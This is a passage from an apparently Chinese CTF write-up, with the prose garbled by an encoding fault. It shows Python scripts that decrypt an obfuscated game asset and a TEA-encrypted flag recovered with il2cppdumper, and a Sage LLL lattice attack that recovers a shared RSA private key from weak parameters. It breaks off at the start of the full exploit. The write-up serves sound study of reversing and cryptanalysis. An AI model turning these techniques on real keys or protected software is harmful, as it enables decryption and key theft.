</span></span><span class=line><span class=cl>    <span class=n>e</span> <span class=o>=</span> <span class=mi>1024</span> <span class=o>+</span> <span class=mi>4</span><span class=o>*</span><span class=p>(</span><span class=n>kl</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>d</span><span class=p>[:</span><span class=mi>1024</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>d</span><span class=p>)</span><span class=o>-</span><span class=n>e</span> <span class=o>-</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>d</span><span class=p>)</span><span class=o>-</span><span class=n>e</span><span class=p>)</span><span class=o>%</span><span class=mi>4</span><span class=p>,</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=n>i</span><span class=o>//</span><span class=n>kl</span><span class=p>)</span> <span class=o>%</span> <span class=n>kl</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>e</span><span class=o>+</span><span class=n>i</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^</span> <span class=n>m</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>w</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Path</span><span class=p>(</span><span class=n>outp</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypt</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥il2cppdumperç›´æ¥æ¢å¤ç¬¦å·äº†</p><p><img src=/img/2025-QWNT/32.png alt=img></p><p><img src=/img/2025-QWNT/33.png alt=img></p><p>TEAè½®å­æ²¡æœ‰ä»»ä½•é­”æ”¹ï¼Œå°±æ˜¯teaåŠ å¯†è‡ªèº«ä¹‹åå†è¿›è¡Œå¼‚æˆ–ï¼Œå¼•å…¥æµå¯†ç ç‰¹æ€§</p><p><img src=/img/2025-QWNT/34.png alt=img></p><p>æ ¹æ®PrivateImplementationDetailsçš„ç‰¹æ€§ï¼Œæ„é€ å‡½æ•°çš„è¿™ä¸ªå†…å®¹æ˜¯é€šè¿‡dump.csæ‰¾åç§»åœ¨global-metadataä¸­å–å€¼</p><p><img src=/img/2025-QWNT/35.png alt=img></p><p>æ ¹æ®åç§»ç´¢å¼•åœ°å€</p><p><img src=/img/2025-QWNT/36.png alt=img></p><p>å³å¯æ‰¾åˆ°å¯†æ–‡å¯†é’¥</p><p>æ ¹æ®teaç‰¹æ€§4ä¸ªuintä¸ºå¯†é’¥ï¼Œ40bytesè‡ªç„¶æ˜¯å¯†æ–‡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MASK</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=n>KEYS</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x12345678</span><span class=p>,</span> <span class=mh>0x09101112</span><span class=p>,</span> <span class=mh>0x13141516</span><span class=p>,</span> <span class=mh>0x15161718</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>([</span>
</span></span><span class=line><span class=cl><span class=mh>0xAF</span><span class=p>,</span><span class=mh>0x58</span><span class=p>,</span><span class=mh>0x64</span><span class=p>,</span><span class=mh>0x40</span><span class=p>,</span><span class=mh>0x9D</span><span class=p>,</span><span class=mh>0xB9</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mh>0x67</span><span class=p>,</span><span class=mh>0xAE</span><span class=p>,</span><span class=mh>0xB5</span><span class=p>,</span><span class=mh>0x29</span><span class=p>,</span><span class=mh>0x04</span><span class=p>,</span><span class=mh>0x9E</span><span class=p>,</span><span class=mh>0x86</span><span class=p>,</span><span class=mh>0xC5</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x23</span><span class=p>,</span><span class=mh>0x0F</span><span class=p>,</span><span class=mh>0xBF</span><span class=p>,</span><span class=mh>0xA6</span><span class=p>,</span><span class=mh>0xB2</span><span class=p>,</span><span class=mh>0xAE</span><span class=p>,</span><span class=mh>0x4A</span><span class=p>,</span><span class=mh>0xB5</span><span class=p>,</span><span class=mh>0xC5</span><span class=p>,</span><span class=mh>0x69</span><span class=p>,</span><span class=mh>0xB7</span><span class=p>,</span><span class=mh>0xA8</span><span class=p>,</span><span class=mh>0x03</span><span class=p>,</span><span class=mh>0xD1</span><span class=p>,</span><span class=mh>0xAE</span><span class=p>,</span><span class=mh>0xCF</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xC6</span><span class=p>,</span><span class=mh>0x2C</span><span class=p>,</span><span class=mh>0x5B</span><span class=p>,</span><span class=mh>0x7F</span><span class=p>,</span><span class=mh>0xA2</span><span class=p>,</span><span class=mh>0x86</span><span class=p>,</span><span class=mh>0x1E</span><span class=p>,</span><span class=mh>0x1A</span>
</span></span><span class=line><span class=cl><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get32</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set32</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>v</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>struct</span><span class=o>.</span><span class=n>pack_into</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>v</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tea_like</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v0</span><span class=p>,</span> <span class=n>v1</span> <span class=o>=</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>    <span class=n>delta</span> <span class=o>=</span> <span class=mh>0x61C88647</span>
</span></span><span class=line><span class=cl>    <span class=n>sumv</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>sumv</span> <span class=o>=</span> <span class=p>(</span><span class=n>sumv</span> <span class=o>-</span> <span class=n>delta</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>sumv</span> <span class=o>=</span> <span class=p>(</span><span class=n>sumv</span> <span class=o>+</span> <span class=n>delta</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>t1</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v0</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>t2</span> <span class=o>=</span> <span class=p>(</span><span class=n>v0</span> <span class=o>+</span> <span class=n>sumv</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>t3</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v0</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>v1</span> <span class=o>=</span> <span class=p>(</span><span class=n>v1</span> <span class=o>-</span> <span class=p>(</span><span class=n>t1</span> <span class=o>^</span> <span class=n>t2</span> <span class=o>^</span> <span class=n>t3</span><span class=p>))</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>t1</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>t2</span> <span class=o>=</span> <span class=p>(</span><span class=n>v1</span> <span class=o>+</span> <span class=n>sumv</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>t3</span> <span class=o>=</span> <span class=p>(((</span><span class=n>v1</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>MASK</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>        <span class=n>v0</span> <span class=o>=</span> <span class=p>(</span><span class=n>v0</span> <span class=o>-</span> <span class=p>(</span><span class=n>t1</span> <span class=o>^</span> <span class=n>t2</span> <span class=o>^</span> <span class=n>t3</span><span class=p>))</span> <span class=o>&amp;</span> <span class=n>MASK</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v0</span><span class=p>,</span> <span class=n>v1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>2</span><span class=p>):</span>  <span class=c1># 8,6,4,2</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>=</span> <span class=n>i</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span><span class=p>)</span> <span class=o>^</span> <span class=n>p1</span>
</span></span><span class=line><span class=cl>    <span class=n>v4</span> <span class=o>=</span> <span class=n>get32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>p2</span>
</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>v3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>off</span> <span class=o>+</span> <span class=mi>4</span><span class=p>,</span> <span class=n>v4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span> <span class=o>=</span> <span class=n>tea_like</span><span class=p>((</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>),</span> <span class=n>KEYS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>p2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span> <span class=o>=</span> <span class=n>tea_like</span><span class=p>((</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>),</span> <span class=n>KEYS</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>set32</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>p2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;flag:&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=crypto>Crypto</h1><h2 id=unsafe-parameters>Unsafe Parameters</h2><p>å¤šå› å­å…±ç§é’¥æ”»å‡»ï¼ŒæŒ‰ç…§è¿™ç¯‡è®ºæ–‡å»æ‰“</p><p><a href=http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf>http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e4</span> <span class=o>=</span> <span class=mi>1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span>
</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=mi>528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span>
</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=mi>120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span>
</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=mi>63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span>
</span></span><span class=line><span class=cl><span class=n>e0</span> <span class=o>=</span> <span class=mi>271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span>
</span></span><span class=line><span class=cl><span class=n>n4</span> <span class=o>=</span> <span class=mi>1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span>
</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=mi>1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span>
</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=mi>966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span>
</span></span><span class=line><span class=cl><span class=n>n1</span> <span class=o>=</span> <span class=mi>801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span>
</span></span><span class=line><span class=cl><span class=n>n0</span> <span class=o>=</span> <span class=mi>729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>n4</span> <span class=o>**</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>iroot</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=mi>3</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=p>[[</span><span class=n>M</span><span class=p>,</span> <span class=n>e0</span><span class=p>,</span> <span class=n>e1</span><span class=p>,</span> <span class=n>e2</span><span class=p>,</span> <span class=n>e3</span><span class=p>,</span> <span class=n>e4</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n3</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n4</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=p>(</span><span class=n>L</span><span class=o>.</span><span class=n>LLL</span><span class=p>()[</span><span class=mi>2</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span><span class=o>//</span> <span class=n>M</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#79707249059210800427586261608616662408613108106616463837006013556788454508274558925787023296092333364088239266520329780878389357</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åå°±æ˜¯å·²çŸ¥eï¼Œdï¼Œnåˆ†è§£näº†ï¼Œå¥—æ¿å­æ¢­å“ˆ</p><p>å®Œæ•´exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e4</span> <span class=o>=</span> <span class=mi>1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span>
